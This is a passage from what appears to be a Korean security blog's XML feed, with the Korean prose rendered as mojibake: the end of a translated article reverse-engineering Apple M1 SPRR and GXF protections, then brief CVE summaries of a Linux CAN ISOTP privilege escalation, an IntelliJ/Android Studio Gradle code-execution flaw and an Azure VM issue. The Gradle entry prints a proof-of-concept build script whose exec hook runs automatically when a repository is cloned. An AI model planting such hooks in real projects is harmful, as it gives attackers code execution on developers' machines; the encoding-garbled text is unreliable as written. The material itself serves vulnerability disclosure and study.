EL ê¶Œí•œì„ <code>--x</code> ê¶Œí•œìœ¼ë¡œ ë³€ê²½í•œë‹¤. ELì˜ ì½”ë“œë¥¼ ìˆ¨ê¸°ê±°ë‚˜ exploitì— ëŒ€í•œ ì¶”ê°€ì ì¸ ë³´í˜¸ ê¸°ë²•ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì¸¡ëœë‹¤.</li></ul><h2 id="Pythonì„-í†µí•œ-GL2-ì¦ëª…"><a href="#Pythonì„-í†µí•œ-GL2-ì¦ëª…" class="headerlink" title="Pythonì„ í†µí•œ GL2 ì¦ëª…"></a>Pythonì„ í†µí•œ GL2 ì¦ëª…</h2><p>ì´ëŸ¬í•œ ì§€ì‹ì„ ê°€ì§€ê³  m1n1ì—ì„œ GL2ë¥¼ ì‹¤í–‰í•˜ëŠ” custom payloadë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆë‹¤. EL1/EL0ì— ì´ë¯¸ ì¡´ì¬í•˜ëŠ” í”„ë ˆì„ì›Œí¬ë¥¼ ì¶”ê°€í•  í•„ìš”ê°€ ìˆë‹¤. MMUë¥¼ ë¹„í™œì„±í™”(SPRRì„ í™œì„±í™”í•œ ìƒíƒœì—ì„œ rwx í˜ì´ì§€ì—ì„œ m1n1ì´ ì‹¤í–‰ë˜ë¯€ë¡œ)í•˜ê³  í˜ì´ë¡œë“œë¡œ ì´ë™í•œ ë‹¤ìŒ return í•˜ê¸° ì „ì— MMUë¥¼ ë‹¤ì‹œ í™œì„±í™”í•˜ë©´ ëœë‹¤.</p><p>GL2ë¥¼ íƒìƒ‰í•˜ì—¬ <code>S3_6_C15_C10_3</code>ì´ <code>SPSR_GL2</code>ì¼ ê°€ëŠ¥ì„±ì´ ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs angelscript">&gt;&gt;&gt; u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>), call=p.gl_call)<span class="hljs-number">0x60000009</span>&gt;&gt;&gt; u.mrs(SPSR_EL2)<span class="hljs-number">0x60000009</span></code></pre><p>MSR finder ëŒ€ì‹ ì— GL2ì—ì„œ í™•ì¸í•´ë³´ì.</p><pre><code class="hljs python">gxf_regs = find_regs(call=p.gl_call)print(<span class="hljs-string">&quot;GXF&quot;</span>)<span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(gxf_regs - all_regs):    print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))</code></pre><p>ì»¨í…ìŠ¤íŠ¸ì—ì„œë§Œ ì‚¬ìš© ê°€ëŠ¥í•œ ìƒˆë¡œìš´ ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ë“¤ì„ ë°œê²¬í–ˆë‹¤.</p><pre><code class="hljs angelscript">GXF  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code>ì€ GL1 ìš©ë„ì´ê³  <code>3, 6, 15, 11</code>ì€ GL2ë¥¼ ìœ„í•œ ê²ƒì¸ì§€ ì•Œì•„ë‚´ëŠ” ê²ƒì€ ê°„ë‹¨í•˜ë‹¤. EL2ì—ì„œ SPRR ë° GXFë¥¼ í™œì„±í™”í•œ í›„ EL1ë¡œ ë‚®ì¶”ì–´ ë™ì¼í•œ ì‘ì—…ì„ í•˜ë©´ ëœë‹¤. ì´ë²ˆ ì‘ì—…ì€ ìƒˆë¡œìš´ ë ˆì§€ìŠ¤í„°ë§Œì„ êµ¬í•œë‹¤.</p><pre><code class="hljs json">[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code> ê·¸ë£¹ì€ EL1 ë ˆì§€ìŠ¤í„°ì´ë‹¤. í•˜ì§€ë§Œ ì´ê²ƒì€ í¬ê²Œ ë¬¸ì œê°€ ë˜ì§€ëŠ” ì•ŠëŠ”ë‹¤. M1ì€ í•­ìƒ <code>HCR_EL2.E2H</code>ì—ì„œ ì‹¤í–‰ë˜ë©° ì´ëŠ” <code>_EL1</code> ë ˆì§€ìŠ¤í„°ê°€ <code>_EL2</code> ë ˆì§€ìŠ¤í„°ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ ë¨ì„ ì˜ë¯¸í•œë‹¤.</p><p>ì´ì „ XNU ë¦´ë¦¬ìŠ¤ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì´ë¦„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ELR      ELR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_FAR      FAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ESR      ESR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_SPSR     SPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ASPSR    ASPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_VBAR     VBAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_TPIDR    TPIDR_GL11</span></code></pre><p>ì™œ ì´ ë ˆì§€ìŠ¤í„°ë“¤ì´ GL11 suffixë¥¼ ê°€ì§€ê³  ìˆëŠ”ì§€ ë¶„ëª…í•˜ì§€ ì•Šì§€ë§Œ ìœ„ì—ì„œ ì°¾ì€ ë ˆì§€ìŠ¤í„°ì™€ ì‰½ê²Œ ë§¤ì¹˜í•  ìˆ˜ ìˆë‹¤. ASPSRì—ëŠ” <code>gexit</code>ê°€ guarded executionìœ¼ë¡œ return í•´ì•¼ í•˜ëŠ”ì§€ ì¼ë°˜ ì‹¤í–‰ìœ¼ë¡œ return í•´ì•¼ í•˜ëŠ”ì§€ ê²°ì •í•˜ëŠ” ë¹„íŠ¸ê°€ í¬í•¨ë˜ì–´ ìˆë‹¤.</p><h1 id="SPRR-amp-GXF-inside-XNU"><a href="#SPRR-amp-GXF-inside-XNU" class="headerlink" title="SPRR &amp; GXF inside XNU"></a>SPRR &amp; GXF inside XNU</h1><p>ë§ˆì§€ë§‰ìœ¼ë¡œ XNUê°€ ìƒˆë¡œìš´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•˜ì. Jonathanì˜ wirte upì— ì´ë¯¸ SPRRê³¼ GXFê°€ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ ìˆìœ¼ë¯€ë¡œ ì‚´í´ë³¼ ê²ƒì´ ë³„ë¡œ ì—†ë‹¤. SPRRì€ APRRì˜ ì—­í• ì„ ëŒ€ì²´í•  ë¿ì´ë©° ì»¤ë„ì´ í˜ì´ì§€ í…Œì´ë¸”ì— ì“¸ ìˆ˜ ì—†ë„ë¡ í•˜ê³  PPL ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ë„ë¡ í•œë‹¤.</p><p>ì£¼ìš”í•œ ì°¨ì´ì ì€ GXFì´ë‹¤. APRR ë ˆì§€ìŠ¤í„°ë¥¼ ìˆ˜ì •í•˜ëŠ” trampoline í•¨ìˆ˜ë¥¼ ì£¼ì˜í•´ì„œ ë§Œë“œëŠ” ëŒ€ì‹  GXF ì—”íŠ¸ë¦¬ ë²¡í„°ë¥¼ ì„¤ì •í•œë‹¤. ê·¸ëŸ¬ë©´ í˜ì´ì§€ í…Œì´ë¸” ê¶Œí•œì€ ìë™ì ìœ¼ë¡œ ë³€ê²½ë˜ê³  genterëŠ” PPLì„ ì§ì ‘ ê°€ë¦¬í‚¬ ìˆ˜ ìˆë‹¤.</p><p>XNUê°€ SPRRë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì´ˆê¸°í™”í•œë‹¤. ì‹œì‘ í•¨ìˆ˜ëŠ” SPRRì´ EL1 SPRR ê¶Œí•œ ë ˆì§€ìŠ¤í„°ë¥¼ <code>0x2020A505F020F0F0</code>ë¡œ ì´ˆê¸°í™”í•  ìˆ˜ ìˆë„ë¡ ì ì‹œ í™œì„±í™”í•œë‹¤.</p><p>ê·¸ í›„ ì´ˆê¸° GL ë¶€íŠ¸ìŠ¤íŠ¸ë© ì½”ë“œëŠ” ì¶”ê°€ì ì¸ ë³€ê²½ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ lock í•˜ê¸° ì „ì— EL1 ê¶Œí•œì„ <code>0x2020-A506F020F0E0</code>ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•œë‹¤.</p><p>guarded excution modeì˜ ì—”íŠ¸ë¦¬ í¬ì¸íŠ¸ëŠ” ì»¤ë„ í…ìŠ¤íŠ¸ ì˜ì—­ì—ì„œ í•¨ìˆ˜ë¡œ ì„¤ì •ë˜ë©° <code>PPLTEXT</code>ì˜ ì‹œì‘ ë¶€ë¶„ìœ¼ë¡œ ì í”„í•œë‹¤. PPL ì—”íŠ¸ë¦¬ í•¨ìˆ˜ëŠ” SPRR ê¶Œí•œì´ ì˜¬ë°”ë¥´ê²Œ ì„¤ì •ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê³  Jonathanì˜ write upì— ì‘ì„±ëœ ëŒ€ë¡œ ë™ì‘í•œë‹¤.</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ XNUì— ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ SPRR í˜ì´ì§€ ê¶Œí•œì„ ì‚´í´ë³´ì.</p><table><thead><tr><th>Index</th><th>Normal permissions</th><th>SPRR Permissions</th><th>Usage</th></tr></thead><tbody><tr><td>0</td><td>EL0</td><td>EL2</td><td>EL0</td></tr><tr><td>1</td><td><code>--x</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>3</td><td><code>---</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>5</td><td><code>rw-</code></td><td><code>rwx</code></td><td><code>rw-</code> <code>r-x</code></td></tr><tr><td>7</td><td><code>rw-</code></td><td><code>rw-</code></td><td><code>rw-</code></td></tr><tr><td>8</td><td><code>--x</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>---</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>---</code></td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>13</td><td><code>r-x</code></td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>15</td><td><code>r--</code></td><td><code>r--</code></td><td><code>r--</code></td></tr></tbody></table><p>GL ê¶Œí•œì€ GLì´ ì»¤ë„ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ëª»í•˜ê²Œ í•˜ê³ (entry 10) ìœ ì € ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ì—†ê²Œ(entry 7) lock ë  ìˆ˜ ìˆë‹¤. </p><p>ê·¸ ì™¸ì—ë„ ì´ì „ APRR í•˜ë“œì›¨ì–´ì˜ ê¹”ë”í•œ ìƒìœ„ ë²„ì „ìœ¼ë¡œ ëŠê»´ì§„ë‹¤. ì´ëŸ° ë³€í™”ë“¤ì€ ì „ì²´ì ì¸ ì‹œìŠ¤í…œì„ ì˜¤ë¥˜ì— ëœ ì·¨ì•½í•˜ê²Œ ë§Œë“¤ë©°(ë ˆì§€ìŠ¤í„°ë“¤ì„ ì ê·¸ê±°ë‚˜, kernelâ†’PPL ì „í™˜ì´ í•˜ë“œì›¨ì–´ì—ì„œ ë°œìƒí•˜ë©° ì»¤ë„ê³¼ PPL ì˜ˆì™¸ ë²¡í„°ëŠ” ë¶„ë¦¬ë˜ì–´ ìˆë‹¤) ìœ ì—°í•˜ê²Œ ë§Œë“ ë‹¤. APRRì€ ê¶Œí•œì„ ì œê±°í•˜ëŠ” ë°ì—ë§Œ ì‚¬ìš©ë˜ì—ˆì§€ë§Œ SPRRì€ <code>rwx</code> í˜ì´ì§€ê°€ í•„ìš”í•˜ì§€ ì•Šì„ ë•Œ ê¶Œí•œì„ ë‹¤ì‹œ ë§¤í•‘í•  ìˆ˜ ìˆë‹¤.</p><h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>ì• í”Œ ì‹¤ë¦¬ì½˜ì€ ê³µê²©ì— ëŒ€í•œ ì¶”ê°€ì ì¸ ë³´í˜¸ ê¸°ë²•ìœ¼ë¡œ í•¨ê»˜ ë™ì‘í•˜ëŠ” ë‘ ê°€ì§€ ë¹„ë°€ìŠ¤ëŸ¬ìš´ ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆë‹¤. GXFëŠ” GL1ê³¼ GL2ë¼ëŠ” lateral exception levelì„ ë„ì…í•˜ì—¬ ë‹¤ë¥¸ í˜ì´ì§€ ê¶Œí•œìœ¼ë¡œ ELê³¼ ìƒì‘í•˜ëŠ” ê°™ì€ í˜ì´ì§€ í…Œì´ë¸”ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. SPRRì€ ELê³¼ GLì˜ í˜ì´ì§€ ì—”íŠ¸ë¦¬ì—ì„œ ê¶Œí•œ ë¹„íŠ¸ë¥¼ ì¬ì •ì˜í•  ìˆ˜ ìˆë‹¤. ì• í”Œì€ ì´ë¥¼ í†µí•´ GLì˜ ëª¨ë“  í˜ì´ì§€ í…Œì´ë¸” ì¡°ì‘ ì½”ë“œë¥¼ ìˆ¨ê¸°ê³  ELì´ í˜ì´ì§€ í…Œì´ë¸”ì„ ìˆ˜ì •í•  ìˆ˜ ì—†ë„ë¡ í•˜ì˜€ë‹¤. ì´ëŠ” ì»¤ë„ ëª¨ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¡œë¶€í„° í˜ì´ì§€ í…Œì´ë¸”ì„ ë³´í˜¸í•˜ì—¬ ì ì€ attack surfaceì™€ ì˜¤ë²„í—¤ë“œë¥¼ ê°€ì§„ í•˜ì´í¼ ë°”ì´ì €ê°€ íš¨ê³¼ì ìœ¼ë¡œ ë„ì…ëœë‹¤. ì´ ê¸°ëŠ¥ë“¤ì˜ ëŒ€ë¶€ë¶„ì€ íŒŒì´ì¬ê³¼ m1n1ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ í•  ìˆ˜ ìˆë‹¤.</p><p>ë¦¬ëˆ…ìŠ¤ë¥¼ M1ìœ¼ë¡œ í¬íŒ…í•˜ëŠ” ë°ì—ëŠ” ìœ ìš©í•˜ì§€ ì•Šì§€ë§Œ XNUë¥¼ ê°€ìƒí™”í•˜ì—¬ MMIO accessë¥¼ trace í•  ìˆ˜ ìˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>m1</tag>
      
      <tag>apple</tag>
      
      <tag>sprr</tag>
      
      <tag>gxf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-32606: CAN ISOTP ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/05/15/fabu1ous/2021-05-15/"/>
    <url>/2021/05/15/fabu1ous/2021-05-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md">CAN ISOTP local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux Kernel 5.11 through 5.12.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><code>net/can/isopt.c</code>ì˜ í•¨ìˆ˜ <code>iso_setsockopt()</code>ì— use-after-freeë¡œ ì¸í•œ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì€ CAN network subsystem ë‚´ë¶€ì˜ ISOTP CAN network í”„ë¡œí† ì½œì— ìˆìŠµë‹ˆë‹¤. Race conditionìœ¼ë¡œ Socketì´ bound ëœ ì´í›„ì—ë„ socket ì˜µì…˜ì„ ìˆ˜ì •í•  ìˆ˜ ìˆê³  ì´ë¡œ ì¸í•´ use-after-freeê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>CAN ISOTP í”„ë¡œí† ì½œì€ ê¸°ë³¸ ì‰˜ì´ ì•„ë‹Œ ë‹¤ë¥¸ socket ì˜µì…˜ì´ ì‚¬ìš©ë˜ë©´ <code>isotp_setsockopt()</code>ë¥¼ í˜¸ì¶œí•´ socket ì˜µì…˜ì„ ì ìš©ì‹œí‚µë‹ˆë‹¤. <code>isotp_setsockopt()</code>ëŠ” ISOPT socketì´ ì´ë¯¸ ë°”ì¸ë“œ ëœ ìƒíƒœë¼ë©´ ë¦¬í„´, ë°”ì¸ë“œ ë˜ì§€ ì•Šì€ ìƒíƒœë¼ë©´ <code>isotp_bind()</code>ë¥¼ í˜¸ì¶œí•´ ë°”ì¸ë“œ ì‘ì—…ì„ ê±°ì¹˜ê³  user spaceë¡œë¶€í„° socket ì˜µì…˜ ë°ì´í„°ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤.</p><p><code>isotp_bind()</code>ê°€ ISOTP socketì„ ë°”ì¸ë“œ í•  ë•Œ í•´ë‹¹ socket ì˜µì…˜ì˜ <code>flag</code>ê°’ì´  <code>CAN_ISOTP_SF_BROADCAST</code>ê°€ ì•„ë‹ ë•Œë§Œ CAN ìˆ˜ì‹ ê¸°ë¥¼ ë“±ë¡í•©ë‹ˆë‹¤. ë§Œì•½  <code>isotp_bind()</code>ê°€ socketì„ ë°”ì¸ë“œ í•œ ì§í›„ user spaceë¡œë¶€í„° socket ì˜µì…˜ ë°ì´í„°ë¥¼ ë³µì‚¬í•˜ê¸° ì§ì „ì— race conditionì„ ë°œìƒì‹œí‚¨ë‹¤ë©´ <code>flag</code>ê°’ì´ <code>CAN_ISOTP_SF_BROADCAST</code>ì´ë©´ì„œ CAN ìˆ˜ì‹ ê¸°ê°€ ë“±ë¡ëœ socketì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´í›„ì— í•¨ìˆ˜ <code>isotp_release()</code>ê°€ í˜¸ì¶œë˜ì–´ socketì„ í•´ì œí•  ë•Œ <code>flag</code>ê°’ì´  <code>CAN_ISOTP_SF_BROADCAST</code>ì´ë¯€ë¡œ ë“±ë¡ëœ CAN ìˆ˜ì‹ ê¸°ë¥¼ ê·¸ëŒ€ë¡œ ë‚¨ê²¨ë†“ìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì´ë¯¸ í•´ì œëœ socketì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë˜ê³  use-after-freeê°€ ë°œìƒí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ ì·¨ì•½ì ì„ ì•…ìš©í•´ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-29263: IntelliJ, Android Studioì˜ ì™¸ë¶€ ì €ì¥ì†Œë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/05/14/l0ch/2021-05-14/"/>
    <url>/2021/05/14/l0ch/2021-05-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-337_338-intellij-idea-android-studio/">GHSL-2020-337_338: Arbitrary code execution when cloning/checking out a Gradle project - CVE-2021-29263</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>IntelliJ IDEA</li><li>Android Studio</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>IntelliJì™€ Android Studioì—ì„œ ì•…ì„± ì €ì¥ì†Œë¥¼ ê°€ì ¸ì˜¬ ë•Œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ GitHub Security Labì— ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Groovyë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ì˜¤í”ˆì†ŒìŠ¤ ë¹Œë“œ ë„êµ¬ì¸ <a href="https://github.com/gradle/gradle">Gradle</a> ì„ clone ë˜ëŠ” checkoutí•  ë•Œ IntelliJì™€ Android StudioëŠ” ìœ ì € í™•ì¸ë‹¨ê³„ë¥¼ ìƒëµí•˜ê³  ë¹Œë“œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•œ í•´ì»¤ê°€ ì•…ì„± ì €ì¥ì†Œë¥¼ íƒ€ê²Ÿì— clone í˜¹ì€ checkout í•˜ë„ë¡ ìœ ë„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ Gradleì˜ <code>exec</code>ê°€ íƒ€ê²Ÿì˜ ìƒí˜¸ì‘ìš© ì—†ì´ malware dropper ê¸°ëŠ¥ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">apply plugin: <span class="hljs-string">&#x27;java&#x27;</span>sourceCompatibility = <span class="hljs-number">1.8</span>targetCompatibility = <span class="hljs-number">1.8</span>void checkRequirements()&#123;    <span class="hljs-keyword">exec</span> &#123;      executable <span class="hljs-string">&#x27;touch&#x27;</span>      args <span class="hljs-string">&#x27;/tmp/pwned_from_gradle&#x27;</span>    &#125;&#125;build&#123;    checkRequirements();&#125;</code></pre><p>MSì˜ Visual Studioì—ì„œë„ ë¹„ìŠ·í•œ ìœ í˜•ì˜ ì·¨ì•½ì (CVE-2020-17156)ì´ íŒ¨ì¹˜ëœ ì ì´ ìˆìœ¼ë©° ì´ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ì €ì¥ì†Œë¥¼ ì´ìš©í•  ë•Œ ì£¼ì˜ë¥¼ ê¸°ìš¸ì¼ í•„ìš”ê°€ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>gradle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27075: Microsoft Azure ê¶Œí•œ ìƒìŠ¹ ë° ì •ë³´ ìœ ì¶œ ì·¨ì•½ì </title>
    <link href="/2021/05/13/idioth/2021-05-13/"/>
    <url>/2021/05/13/idioth/2021-05-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/cloud-security/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/">CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure VM Extension</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftì˜ í´ë¼ìš°ë“œ ì»´í“¨íŒ… í”Œë«í¼ Microsoft Azureì—ì„œ VM Linux ì‹œìŠ¤í…œì˜ ê¶Œí•œ ìƒìŠ¹ê³¼ ì •ë³´ ìœ ì¶œì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Azure VMì€ ê°œë°œìì™€ ê´€ë¦¬ìê°€ ì¶”ê°€ êµ¬ì„±ìš”ì†Œë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆë„ë¡ í†µí•© í”ŒëŸ¬ê·¸ì¸ ì‹œìŠ¤í…œì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì„ í†µí•´ Azureì—ì„œ ì œê³µí•˜ëŠ” first party ì™¸ì— third party app ë˜í•œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í™•ì¥ í”„ë¡œê·¸ë¨ ì„¤ì¹˜ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´ Microsoft Azure Guest Agentê°€ <code>/var/lib/waagent</code>ì— ì„¤ì¹˜ë©ë‹ˆë‹¤. ì´ ë””ë ‰í„°ë¦¬ì—ëŠ” í™•ì¥ í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ì •ë³´ê°€ ì 